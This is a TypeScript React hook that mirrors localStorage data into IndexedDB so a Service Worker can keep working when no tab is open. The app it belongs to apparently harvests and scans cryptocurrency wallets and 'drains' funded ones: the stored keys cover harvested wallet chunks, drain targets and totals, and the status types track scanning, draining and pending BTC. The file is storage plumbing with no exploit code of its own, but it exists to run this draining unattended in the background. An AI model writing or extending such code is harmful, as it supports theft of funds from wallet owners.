/**
 * useIDBSync
 *
 * Mirrors critical localStorage keys into IndexedDB so the Service Worker
 * can read pool data and drain destinations even when no tab is open.
 *
 * Also reads BG status/log from IDB so the UI can show background activity.
 */
import { useEffect, useState, useCallback } from 'react';

const DB_NAME    = 'ckg_sw_bridge';
const STORE      = 'kv';
const DB_VERSION = 1;

// Keys to mirror from localStorage → IDB on every change
const MIRROR_KEYS = [
  'ckg_harvest_count_v2',
  'ckg_drain_targets_v1',
  'ckg_saved_wallets_v1',
  'ckg_drain_totals_v1',
  'passive_wallets_count',
];

// Chunk key prefixes to mirror (we scan up to the count)
const CHUNK_MIRRORS = [
  { countKey: 'ckg_harvest_count_v2',  prefix: 'ckg_harvest_chunk_v2_',  size: 500 },
  { countKey: 'passive_wallets_count', prefix: 'passive_wallets_chunk_',  size: 500 },
];

function openDB(): Promise<IDBDatabase> {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(DB_NAME, DB_VERSION);
    req.onupgradeneeded = e => {
      (e.target as IDBOpenDBRequest).result.createObjectStore(STORE);
    };
    req.onsuccess = e => resolve((e.target as IDBOpenDBRequest).result);
    req.onerror   = e => reject((e.target as IDBOpenDBRequest).error);
  });
}

async function idbSet(key: string, value: string) {
  try {
    const db = await openDB();
    await new Promise<void>((res, rej) => {
      const tx  = db.transaction(STORE, 'readwrite');
      const req = tx.objectStore(STORE).put(value, key);
      req.onsuccess = () => res();
      req.onerror   = () => rej(req.error);
    });
  } catch { /* ignore IDB errors */ }
}

async function idbGet(key: string): Promise<string | null> {
  try {
    const db = await openDB();
    return new Promise((res, rej) => {
      const tx  = db.transaction(STORE, 'readonly');
      const req = tx.objectStore(STORE).get(key);
      req.onsuccess = () => res((req.result as string) ?? null);
      req.onerror   = () => rej(req.error);
    });
  } catch { return null; }
}

/** Mirror one localStorage key to IDB */
async function mirrorKey(key: string) {
  const val = localStorage.getItem(key);
  if (val !== null) await idbSet(key, val);
}

/** Mirror all chunk keys for a given prefix up to count */
async function mirrorChunks(countKey: string, prefix: string, chunkSize: number) {
  const count = parseInt(localStorage.getItem(countKey) ?? '0', 10) || 0;
  const total = Math.ceil(count / chunkSize);
  for (let i = 0; i < total; i++) {
    const key = `${prefix}${i}`;
    const val = localStorage.getItem(key);
    if (val !== null) await idbSet(key, val);
  }
}

/** Full sync: mirror all tracked keys to IDB */
async function syncAll() {
  for (const key of MIRROR_KEYS) await mirrorKey(key);
  for (const { countKey, prefix, size } of CHUNK_MIRRORS) {
    await mirrorChunks(countKey, prefix, size);
  }
}

export interface BgStatus {
  phase: 'idle' | 'scanning' | 'draining' | 'delegated';
  scanned?: number;
  total?: number;
  found?: number;
  drained?: number;
  pendingBtc?: number;
  reason?: string;
  updatedAt?: number;
}

export interface BgLogEntry {
  type: string;
  ts: number;
  address?: string;
  network?: string;
  scanned?: number;
  found?: number;
  funded?: number;
  drained?: number;
  error?: string;
  method?: string;
}

export function useIDBSync() {
  const [bgStatus, setBgStatus] = useState<BgStatus | null>(null);
  const [bgLog, setBgLog]       = useState<BgLogEntry[]>([]);

  // Sync localStorage → IDB whenever anything changes
  useEffect(() => {
    // Initial sync
    syncAll();

    // Sync on storage events (cross-tab) and periodically
    const handle = () => syncAll();
    window.addEventListener('storage', handle);
    const interval = setInterval(syncAll, 30_000); // every 30s
    return () => {
      window.removeEventListener('storage', handle);
      clearInterval(interval);
    };
  }, []);

  // Poll IDB for BG status + log every 5s
  useEffect(() => {
    const poll = async () => {
      try {
        const statusRaw = await idbGet('ckg_bg_status_v1');
        if (statusRaw) setBgStatus(JSON.parse(statusRaw));
        const logRaw = await idbGet('ckg_bg_drain_log_v1');
        if (logRaw) setBgLog(JSON.parse(logRaw));
      } catch {}
    };
    poll();
    const id = setInterval(poll, 5000);
    return () => clearInterval(id);
  }, []);

  /** Force a sync now (call after pool changes) */
  const forceSync = useCallback(() => { syncAll(); }, []);

  return { bgStatus, bgLog, forceSync };
}
